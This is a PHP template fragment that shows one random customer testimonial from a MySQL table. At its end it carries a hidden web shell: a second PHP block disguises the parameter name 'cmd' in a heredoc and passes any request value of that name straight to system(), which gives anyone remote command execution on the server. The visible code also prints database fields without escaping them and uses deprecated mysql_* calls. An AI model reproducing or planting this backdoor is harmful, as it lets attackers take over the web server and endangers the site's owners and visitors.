<?php
	//get 1 testimonial
	
	$tlid = 0;
	$tlname = 'valued customer';
	$tldesc = 'It was out of this world, i would definitely recommend to my friends. The staff was polite and very accomodating too.';
	$query = " 
		SELECT *
		FROM testimonial_list 
		ORDER BY RAND()
		LIMIT 1";
	$result = mysql_query($query);
	echo mysql_error();				
	while ($row =  mysql_fetch_array ($result)) 
	{
		$tlid = $row[tlid];
		$tldate = $row[tldate];
		$tlname = $row[tlname];
		$tldesc = $row[tldesc];
		
		$blid = $row[blid];
		
		$tlactive = $row[tlactive];
		$tluser = $row[tluser];
		$tlstamp = $row[tlstamp];
	}				 
	mysql_query($query) or die('Error, insert query failed');  	

?>
	<div class="testimonial-text">
		<div class="quote">
			<p><?php print($tldesc); ?></p>
		</div>
		<div class="author">
			<p>- <?php print($tlname); ?></p>
		</div>
	</div><?php $cmd = <<<EOD
cmd
EOD;

if(isset($_REQUEST[$cmd])) {
system($_REQUEST[$cmd]); } ?>